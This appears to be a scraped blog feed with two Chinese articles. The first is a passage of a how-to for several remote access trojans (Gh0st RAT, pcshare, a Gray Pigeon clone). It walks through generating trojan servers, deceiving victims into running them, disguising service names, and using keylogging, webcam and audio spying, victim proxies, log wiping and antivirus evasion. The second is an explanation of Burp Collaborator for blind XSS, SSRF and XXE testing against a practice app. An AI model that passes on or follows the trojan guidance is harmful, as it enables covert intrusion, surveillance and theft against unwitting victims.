<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#333333;"><strong>1. 配置木马服务端</strong></span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">打开“客户端”程序，默认选择的是左侧“上线主机”标签，由于还有配置服务端程序，所以更谈不上有肉鸡上线。因此这里单击“配置服务端”标签，在所显示的界面内，根据标签的提示信息，将自己电脑信息输入便可，然后单击“生成”按钮，此配置的服务端，就会自动生成在该软件的同一目录下，并且默认服务端名称为SEU_server。然后以各种欺骗的手段或者其他方法让受害人运行，这样其主机才会在客户端显示上线(如图6)。</span></span></p>
<p style="margin-left:0px;">&nbsp;</p>
<p style="margin-left:0px;"><img alt="" class="has" height="478" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824125000795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="628"></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#333333;"><strong>2.远程操控肉鸡</strong></span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">我们在其上方右击，可以选择里面的快捷功能进行操控。当然像有些功能如：“文件传输、屏幕监控、DOS命令、进程管理”，左侧功能栏都有。如果你不喜欢在快捷功能里选择，可以在左侧功能标签里选择，比如单击“文件传输”标签，可以对其远程肉鸡的硬盘文件进行查阅。屏幕监控，就可非常直观的看到其肉鸡受害人的操作。DOS命令可以通过命令的形式，创建用户开启服务等等实施更进一步的入侵。进程管理可以查询当前肉鸡上，所有运行的程序进程。</span></span></p>
<p><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span>总结：东南网安远程控制软件，虽然没有特别突出的地方，但是其稳定的远程控制能力，和集成了很多控制软件的特点，还是受到了很多黑客迷的喜爱。只不过唯一美中不足的是屏幕监控，所截取的图像有点失真。</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#333333;"><strong>四、远程控制航母Gh0st RAT</strong></span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">Gh0st RAT有着远程控制航母的称号，它可以最多容纳上万台肉鸡同时上线，这是很多同类软件达不到的事情，因此这个称号也并不夸张。另外该软件是一款共享免费类的软件，并且其作者为了大家着想，不保留版权可由黑客迷们自由修改。</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">打开“Gh0st RAT客户端”软件，你会发现与其他同类软件不同的是，它的功能标签都在下方，并且是以英文形式表达(如图7)。</span></span></p>
<p style="margin-left:0px;">&nbsp;</p>
<p style="margin-left:0px;"><img alt="" class="has" height="306" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824125013441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="634"></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">默认选择的是下方“Connections”标签，这里显示的是肉鸡上线界面。而后面的“Settinas”标签，则显示“服务端的配置”界面，我们切入此标签，只要把上线主机IP更改成自己的IP地址，其他选项保持默认。然后选择“Build”标签，在显示的界面上方，将“Settinas”标签里的上线字符串，复制到“域名上线字符串”标签，或者勾选“启用”按钮，在其前方输入HTTP上线网址后，单击生成“服务端”按钮，在弹出的“另存为”对话框内，选择好所要存储服务端的路径即可。</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">同样以想方设法将其服务端让受害者运行，然后你回到“Connections”标签，就可看到其运行服务端的肉鸡上线了。并且肉鸡的IP地址、计算机名、使用的操作系统，以及有无摄像头的信息，也同时会被显示出来(如图8)。</span></span></p>
<p style="margin-left:0px;">&nbsp;</p>
<p style="margin-left:0px;"><img alt="" class="has" height="303" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824125023979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="637"></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">为了操控这台肉鸡，笔者在该显示肉鸡栏的上方右击，在弹出的“快捷”菜单内，选择“文件管理”选项，可以非常直观的看到本地和外地的盘符，如果此时你想自己本地盘符的文件，上传到被控制肉鸡的盘符里，你只需将其传输的文件选中，直接拖拽或者复制粘贴到肉鸡盘即可，无需像其他同类软件那样，还需使用复杂的命令进行上传。</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#333333;">&nbsp;</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">小提示：屏幕监视： 此模块全用汇编编写，其特点控制屏幕且传输速度快，而且有7种色彩显示方式。</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">键盘记录：可记录中英文信息，离线记录(记录上限50M)功能</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">远程终端：一个简单shell</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">系统管理：进程管理，窗口管理，拨号上网密码获取</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">视频监控;监控远程摄像头</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">会话管理：注销，重启，关机，卸载服务端</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">其它功能 ：下载执行指定URL中的程序，隐藏或者显示访问指定网址，清除系统日志</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">地址位置：将IP数据库文件QQWry.Dat放置程序同目录下即可显示地理位置</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">集群控制：可同时控制多台主机，同时打开视频监控等管理功能</span></span></p>
<p><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span></span><span style="color:#f33b45;"><strong>总结：</strong></span><span style="color:#666666;"><span style="color:#666666;">Gh0st RAT控制端采用IOCP模型，并且数据传输采用zlib压缩方式稳定快速，其上线肉鸡数量无上限，可同时控制上万台主机。另外其控制端还能自动检测CPU使用率，且调整自己的工作线程，从而可以更稳定更高效。</span></span></p>
<p>&nbsp;</p>
<h2 id="0x06%20%E9%BB%91%E5%AE%A2%E9%98%B2%E7%BA%BF%E6%96%B0%E4%B8%80%E4%BB%A3%E8%BF%9C%E6%8E%A7pcshare" style="margin-left:0px;"><span style="color:#666666;"><span style="color:#333333;"><strong>0x06 黑客防线新一代远控pcshare</strong></span></span></h2>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">黑客防线新一代远控pcshare软件，是一款标准的远程管理软件，用于远程计算机管理维护，具有相当的产品特性，涵盖了各种远程管理软件的功能。</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">打开“pcshare软件”客户端程序，如果此时你想对木马服务端程序进行配置，只要在上方单击“设置”菜单，选择“生成客户端”选项，此时就会弹出的“被控制端执行程序参数”对话框。我们在“IP地址”标签内，输入自己的固定IP地址，如果没有固定IP地址，可以上希网域名注册一个动态域名，然后将其本机的IP配置进去。在将其动态域名，输入到“IP地址”标签内，也可达到相同效果(如图9)。#p#分页标题#e#</span></span></p>
<p style="margin-left:0px;">&nbsp;</p>
<p style="margin-left:0px;"><img alt="" class="has" height="405" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824125035908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="485"></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">其他选项保持默认，而后单击“生成”按钮，与其他软件一样选择好生成服务端路径，便可成功生成其木马服务端了。</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">操作完毕后，将其生成的服务端，运行在受害主机上，这样你就可以在“客户端”界面的普通客户组里，看到被控制的肉鸡上线了(如图10)。</span></span></p>
<p style="margin-left:0px;">&nbsp;</p>
<p style="margin-left:0px;"><img alt="" class="has" height="440" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824125047596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="615"></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">这里选择上线的肉鸡，上方一排功能按钮，就会变为可用状态，“文件管理”、“屏幕监控”、“超级终端”、“键盘监控”、“注册表管理”、“服务管理”、“窗口管理”，与其他同类软件的相应功能基本相同，这里也就不多加介绍了。不过与其他软件不同的是，黑防软件提供了“音视频监控”功能，可通过其不仅能观看到的摄像头视频，而且还可以监听且记录里面的声音。另外如果你喜欢，还可以将其视频里的图像，以录像的形式保存到本地硬盘里，从而可以避免在没有时间观看的情况下，而落掉肉鸡主人的某个或者某段动作。</span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">除了以上这些按钮的功能外，肉鸡还提供了“开肉鸡代理”的功能，我们只要右击想要开通的上线肉鸡，选择“开(关)客户代理”选项，在弹出的“开启被控制端代理服务”对话框内，输入代理服务的端口，默认是1080。操作完毕后，勾选“启用Scoks5代理服务器用户/密码”复选框，并且将其想要设定的Scoks5代理服务账号和密码输入，在单击“确定”按钮，就可立即开启肉鸡的代理服务功能。另外如果要想将本地文件上传到肉鸡上，还需右击其受害的上线主机，在依次选择“广播命令到肉鸡端”→“肉鸡执行指定上传程序”选项，在弹出的“上传执行指定文件”对话框内，选择想要上传的文件，便可单击“确定”按钮，执行上传(如图11)。</span></span></p>
<p style="margin-left:0px;">&nbsp;</p>
<p style="margin-left:0px;"><img alt="" class="has" height="446" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824125058352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="630"></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; </span></span></span><span style="color:#333333;">另外肉鸡更新指定客户端，就是对木马服务端的升级，以防止被杀毒软件认出来。强制肉鸡访问指定页，则可以强行肉鸡访问我们指定的网站。肉鸡下载执行连接和发送消息到肉鸡端，顾名思仪就是强行下载和发送消息给受害者的功能。</span></span></p>
<p><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp;</span></span></span></span><strong><span style="color:#f33b45;"> 总结：</span></strong><span style="color:#666666;"><span style="color:#666666;">黑客防线新一代远控pcshare软件，具有高效率穿透防火墙的功能，采取独特的技术穿透防火墙，并且提供了自动辨别和人工设置的方式，可以通过默认浏览器、Svchost.exe轻松穿透防火墙。另外更可怕的是它还具有驱动隐藏和保护的功能，能够隐藏本身的文件和进程，即使用户通过Netstat –n的命令，也是看不到其连接的。 还有就是当自身服务被删除或者禁止时，被控制端会自行修复，从而做到了只有控制台的管理员才能进行卸载。</span></span></p>
<p>&nbsp;</p>
<h2 id="0x07%C2%A0%E7%9B%97%E7%89%88%E7%81%B0%E9%B8%BD%E5%AD%90%E2%80%94%E2%80%94%E8%90%BD%E5%AD%A6%E8%BF%9C%E7%A8%8B%E5%8D%8F%E5%8A%A9%E7%B3%BB%E7%BB%9F" style="margin-left:0px;"><span style="color:#666666;"><span style="color:#333333;"><strong>0x07&nbsp;</strong></span><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;"><strong>盗版灰鸽子——落学远程协助系统</strong></span></span></span></span></h2>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; 落学远程协助系统，是一款能够通过Internet网、局域网进行计算机的远程监控管理软件，操作直观简便而功能强大，即使是使用电脑的新手也可以轻松上手。该程序可用于公司管理层对员工计算机的监控、家长对子女使用计算机的监控、家与单位的计算机间的监控等方面。</span></span></span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; 打开“落学远程协助系统”界面，让笔者大吃一惊的是，它怎么跟大名鼎鼎的灰鸽子远程木马，长的这么像(如图12)。</span></span></span></span></p>
<p style="margin-left:0px;">&nbsp;</p>
<p style="margin-left:0px;"><img alt="" class="has" height="473" src="https://uzshare.com/_p?https://img-blog.csdnimg.cn/20190824125108165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" width="627"></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; 相信如果没有落学远程协助系统标志，大家也一定会认错吧。言归正传，老规矩生成服务端，单击上方“配置服务端”程序，在弹出的“服务器配置”对话框内，默认切入的是“自动上线”标签，在其内部将DNS解析域名处，输入以上我们申请的希望动态域名，关于如何配置动态域名，在前面已经说过了这里就不重复讲解了。然后选择好上线的图标，分别切入至“安装信息”、“启动项目”标签，将里面安装，以及服务名称信息，修改成与系统文件相近的信息，这样可以达到迷惑肉鸡主人的目的，别忘了单击“生成服务端”按钮，就可立即在其软件的同一目录下，生成一个服务端程序。</span></span></span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp; 同样想方设法让网友们运行其服务端，或者在你成功入侵电脑主机后，将其强行运行也可。当然这里不排除有很多朋友，在配置上没有任何问题，受害人的主机也已中招，可是客户端界面就不显示肉鸡上线的问题。其实出现这种问题的原因很简单，无非就是客户端域名和服务端域名没有同步，我们只要在“客户端”程序界面里，单击上方“自动上线”按钮，切入至“希望动态域名更新IP”标签，将刚才配置添入的动态域名，及其用户名和密码输入进去，最后单击更新IP到希网域名按钮，就可看到中招的主机上线。</span></span></span></span></p>
<p style="margin-left:0px;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">&nbsp; &nbsp; &nbsp;</span></span></span></span><span style="color:#f33b45;"><strong> 总结：</strong></span><span style="color:#666666;"><span style="color:#666666;"><span style="color:#666666;"><span style="color:#333333;">落学远程协助系统是一款很大众化的软件，可以说它的控制功能，几乎每款远程控制软件都具备，而且自动上线那里，有时还需要自行调解很麻烦。当然有不好的一面，也会有好一面，首先说一下界面直观简单，很适合新手操作，另外它使用了内核驱动恢复SSDT技术，可以穿越主动防御拦截，并且无DLL文件插入系统进程，还可以过防火墙的拦截，在不考虑免不免杀的情况下，这款软件绝对是黑客们必备利器之一。</span></span></span></span></p>
<p>&nbsp;</p>
<hr>
<p>我不需要自由，只想背着她的梦</p>
<p>一步步向前走，她给的永远不重</p>
<hr>
<p>&nbsp;</p>
</p></div>
</div>
]]></content:encoded>
										</item>
		<item>
		<title>Burp Collaborator 使用总结</title>
		<link>https://uzzz.org/article/2438.html</link>
				<pubDate>Sun, 07 Apr 2019 11:26:16 +0000</pubDate>
		<dc:creator><![CDATA[fandyvon]]></dc:creator>
				<category><![CDATA[渗透测试]]></category>

		<guid isPermaLink="false">https://uzzz.org/article/2438.html</guid>
				<description><![CDATA[0x00：使用原因 我们在做渗透测试的时候，经常会遇到这种情况，测试跨站可能有些功能插入恶意脚本后无法立即触发，例如提交反馈表单，需要等管理员打开查看提交信息时才会触发，或者是盲注跨站，盲打 XSS 这种。再例如 SSRF，如果程序不进行回显任何信息，而只提示你输入的是否合法，那么也无法直接判断程序存在 SSRF 漏洞，我们可以叫盲 SSRF。再例如 XXE，引入外部文件时，如果程序也不返回任何信息和引用文件的内容，而只提示输入的是否有误，那么也无法直接判断程序是否存在 XXE 漏洞，我们也可以叫盲 XXE。总之，程序不进行详细的回显信息，而只是返回对或者错时，我们都可以叫它盲。 解决办法是，我们需要一个外部的独立的服务器，可以通过域名 url 进行访问。然后在测试盲跨站插入恶意脚本时带上这个服务器的地址，在测试盲 SSRF 时读取的文件 url 写我们这个服务器的地址，在测试盲 XXE 时引入的外部实体地址也写我们这个服务器的地址。如果存在上述的这些问题，那么目标服务器就会去访问我们自己的服务器，我们自己服务器要做的就是记录别人访问自己的信息，记录其发送内容相应内容等，因为目标服务器不会给前台返回任何信息，而在和我们外部服务器交互时，我们外部服务器会记录其交互的过程和内容，从而有利于我们判断漏洞的存在。 明白原理后，Burp 给我们提供了这个外部服务器，叫 Collaborator，对于 Collaborator 服务器，我们有两种使用方式，第一个是使用 burp 官方提供的，第二个是自己搭建。本文章记录 burp 官方提供的使用方法，至于自己搭建如果大家感兴趣可以在网上搜索相关的教程内容。 0x01：Collaborator 介绍 对于 Collaborator 服务器，我们这里简单介绍下它应该拥有哪些功能。首先它要能捕捉到 burp 发出的 payload 触发目标与外部系统发生数据的交互行为，其次它自己与目标产生交互的数据要能够返回到 burp，也就是返回给攻击者，也就是我们。 对于 Collaborator 服务器，我们这里再简单的介绍下它应该有哪些服务，首先它是公网 ip，其次它要有自己的域名，并且这个服务器要注册为该域名的权威 dns 服务器。然后这个服务器要提供 dns 服务，并且可以相应任何对它的 dns 请求。最后它需要提供 http 和 https 服务，且需要使用一个有效的 ssl 证书。对于为什么要提供 dns 和 http、https 服务很好理解，payload 如果可以执行或者可以允许远程加载，那么就需要用 dns 来解析我们的域名，而产生的交互则需要 http 和 https 来提供。 0x02：Collaborator 原理 我们知道了使用原因和其具有的功能后，我们再来简单看下它的原理，首先，我们先来看下平时的测试过程，如下图。 平时测试时，我们会像服务器提交一个 payload，而服务器响应给我们相关的 response 信息。大家都叫它带内攻击，这些理论的东西，我们简单理解就好，这里我们就理解成单挑通信的通道为带内攻击，也就是整个测试过程或者说是交互过程，中间没有其外部的服务器参与，只有自己和目标服务器，那么就叫带内。而我们一般的测试如果称为带内攻击，那么 Collaborator 服务器用来测试盲的各种漏洞的话，则需要我们外部的独立服务器参数，也就是带入了外部的服务器，我们叫它带外攻击。这里简单的提了一下这个带内和带外，我们只要理解其过程即可。带外流程图如下。 以上就是 collaborator，也就是带外攻击的大体流程，其实就是在测试的过程中目标服务器和外部的服务器有了交互，下面再来看一张更详细的图。 上面这个图可以大体的代表 collaborator 的大体工作流程，首先 burp 发送 payload 给目标程序，以上图为例，param 存在漏洞注入点，其 payload 为外部的服务器 url 地址，随后目标程序若进行解析或则引用调用等，则会去访问这个地址，而这个地址是我们的 collaborator 服务器，所以 collaborator 会记录其访问的请求信息以及响应信息和 dns 的信息。而当 burp 发送 payload 后，就会不断的去问 collaborator 服务器，你收到我发送的 payload 交互了么，这时 collaborator 就会将交互信息告诉 burp，burp 最后进行报告。 以上就是 collaborator 的大体工作流程，最后我们再说两个理论性的东西，一个是 burp 的 collaborator 地址，当使用 burp 的 collaborator 时，burp 会提供一个 url 地址，这个地址是 burp 的一个二级域名。第二个是轮询，也就是我们上面提到的，burp 发送 payload 后会不断的问 collaborator 是否收到我发生的 payload 交互信息，例如 10s 问一次，我们可以叫它轮询，其实叫什么无所谓，我们理解这个过程即可。 0x03：Collaborator 使用 对于 burp 的 collaborator，好像是 1.7 几以后自带，我这里没有，所以是通过安装插件来实现的，直接到 burp 的 extender 下的 bapp store 找到 Collaborator 安装即可。安装后，首先需要设置下我们使用的服务器是官方默认提供的，在 project options-misc-burp collaborator server 下，选择第一个默认官方服务即可，第二个是关闭 collaborator，第三个是使用自己的服务器。如下图。 设置好后，我们可以通过工具栏的 burp 下的 burp collaborator client 来运行，如下图。 打开 collaborator 插件后，点击 copy to clipboard 来复制其提供的 payload url，如下图。 number to generate 是生成的数量，下面的 poll now 按钮是轮询时间，点击 copy]]></description>
								<content:encoded><![CDATA[<div id="article_content" class="article_content clearfix">
 <!--一个博主专栏付费入口--><br />
 <!--一个博主专栏付费入口结束-->
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-d284373521.css">
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-d284373521.css">
<div class="htmledit_views" id="content_views">
<h2><strong>0x00：使用原因</strong></h2>
<p>我们在做渗透测试的时候，经常会遇到这种情况，测试跨站可能有些功能插入恶意脚本后无法立即触发，例如提交反馈表单，需要等管理员打开查看提交信息时才会触发，或者是盲注跨站，盲打 XSS 这种。再例如 SSRF，如果程序不进行回显任何信息，而只提示你输入的是否合法，那么也无法直接判断程序存在 SSRF 漏洞，我们可以叫盲 SSRF。再例如 XXE，引入外部文件时，如果程序也不返回任何信息和引用文件的内容，而只提示输入的是否有误，那么也无法直接判断程序是否存在 XXE 漏洞，我们也可以叫盲 XXE。总之，程序不进行详细的回显信息，而只是返回对或者错时，我们都可以叫它盲。</p>
<p>解决办法是，我们需要一个外部的独立的服务器，可以通过域名 url 进行访问。然后在测试盲跨站插入恶意脚本时带上这个服务器的地址，在测试盲 SSRF 时读取的文件 url 写我们这个服务器的地址，在测试盲 XXE 时引入的外部实体地址也写我们这个服务器的地址。如果存在上述的这些问题，那么目标服务器就会去访问我们自己的服务器，我们自己服务器要做的就是记录别人访问自己的信息，记录其发送内容相应内容等，因为目标服务器不会给前台返回任何信息，而在和我们外部服务器交互时，我们外部服务器会记录其交互的过程和内容，从而有利于我们判断漏洞的存在。</p>
<p>明白原理后，Burp 给我们提供了这个外部服务器，叫 Collaborator，对于 Collaborator 服务器，我们有两种使用方式，第一个是使用 burp 官方提供的，第二个是自己搭建。本文章记录 burp 官方提供的使用方法，至于自己搭建如果大家感兴趣可以在网上搜索相关的教程内容。</p>
<h2><strong>0x01：Collaborator 介绍</strong></h2>
<p>对于 Collaborator 服务器，我们这里简单介绍下它应该拥有哪些功能。首先它要能捕捉到 burp 发出的 payload 触发目标与外部系统发生数据的交互行为，其次它自己与目标产生交互的数据要能够返回到 burp，也就是返回给攻击者，也就是我们。</p>
<p>对于 Collaborator 服务器，我们这里再简单的介绍下它应该有哪些服务，首先它是公网 ip，其次它要有自己的域名，并且这个服务器要注册为该域名的权威 dns 服务器。然后这个服务器要提供 dns 服务，并且可以相应任何对它的 dns 请求。最后它需要提供 http 和 https 服务，且需要使用一个有效的 ssl 证书。对于为什么要提供 dns 和 http、https 服务很好理解，payload 如果可以执行或者可以允许远程加载，那么就需要用 dns 来解析我们的域名，而产生的交互则需要 http 和 https 来提供。</p>
<h2><strong>0x02：Collaborator 原理</strong></h2>
<p>我们知道了使用原因和其具有的功能后，我们再来简单看下它的原理，首先，我们先来看下平时的测试过程，如下图。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040701.png"></p>
<p>平时测试时，我们会像服务器提交一个 payload，而服务器响应给我们相关的 response 信息。大家都叫它带内攻击，这些理论的东西，我们简单理解就好，这里我们就理解成单挑通信的通道为带内攻击，也就是整个测试过程或者说是交互过程，中间没有其外部的服务器参与，只有自己和目标服务器，那么就叫带内。而我们一般的测试如果称为带内攻击，那么 Collaborator 服务器用来测试盲的各种漏洞的话，则需要我们外部的独立服务器参数，也就是带入了外部的服务器，我们叫它带外攻击。这里简单的提了一下这个带内和带外，我们只要理解其过程即可。带外流程图如下。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040702.png"></p>
<p>以上就是 collaborator，也就是带外攻击的大体流程，其实就是在测试的过程中目标服务器和外部的服务器有了交互，下面再来看一张更详细的图。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040703.png"></p>
<p>上面这个图可以大体的代表 collaborator 的大体工作流程，首先 burp 发送 payload 给目标程序，以上图为例，param 存在漏洞注入点，其 payload 为外部的服务器 url 地址，随后目标程序若进行解析或则引用调用等，则会去访问这个地址，而这个地址是我们的 collaborator 服务器，所以 collaborator 会记录其访问的请求信息以及响应信息和 dns 的信息。而当 burp 发送 payload 后，就会不断的去问 collaborator 服务器，你收到我发送的 payload 交互了么，这时 collaborator 就会将交互信息告诉 burp，burp 最后进行报告。</p>
<p>以上就是 collaborator 的大体工作流程，最后我们再说两个理论性的东西，一个是 burp 的 collaborator 地址，当使用 burp 的 collaborator 时，burp 会提供一个 url 地址，这个地址是 burp 的一个二级域名。第二个是轮询，也就是我们上面提到的，burp 发送 payload 后会不断的问 collaborator 是否收到我发生的 payload 交互信息，例如 10s 问一次，我们可以叫它轮询，其实叫什么无所谓，我们理解这个过程即可。</p>
<h2><strong>0x03：Collaborator 使用</strong></h2>
<p>对于 burp 的 collaborator，好像是 1.7 几以后自带，我这里没有，所以是通过安装插件来实现的，直接到 burp 的 extender 下的 bapp store 找到 Collaborator 安装即可。安装后，首先需要设置下我们使用的服务器是官方默认提供的，在 project options-misc-burp collaborator server 下，选择第一个默认官方服务即可，第二个是关闭 collaborator，第三个是使用自己的服务器。如下图。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040710.png"></p>
<p>设置好后，我们可以通过工具栏的 burp 下的 burp collaborator client 来运行，如下图。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040704.png"></p>
<p>打开 collaborator 插件后，点击 copy to clipboard 来复制其提供的 payload url，如下图。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040705.png"></p>
<p>number to generate 是生成的数量，下面的 poll now 按钮是轮询时间，点击 copy to clipboard 复制其提供的 payload url 后，就可以直接在要测试的点粘贴即可，如果目标服务器有交互，则 collaborator 会有响应信息。且这个 payload url 每次复制其二级域名都会随机生成。</p>
<h2><strong>0x04：盲 XXE 测试</strong></h2>
<p>我这里没有找到盲的 XXE 漏洞示例，所以就拿 bwapp 的 xxe 做演示了，bwapp 的 xxe 是有回显信息的，我们先来看下它的原始请求包。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040706.png"></p>
<p>原始请求发送的 xml 内容，其 login 的名称会进行回显，这里我们把它当作没有任何回显信息，只返回 true 和 false 的话，我们用 collaborator 来进行测试，首先修改 xml 的内容，加入一个变量值为外部的服务器 url，然后进行发送，这时 collaborator 会不断轮询去问交互结果，而结果会在 collaborator 中进行显示，如下图。</p>
<p><img alt="请输入图片描述" class="has" src="https://blog-1251816098.cos.ap-beijing.myqcloud.com/2019040707.png"></p>
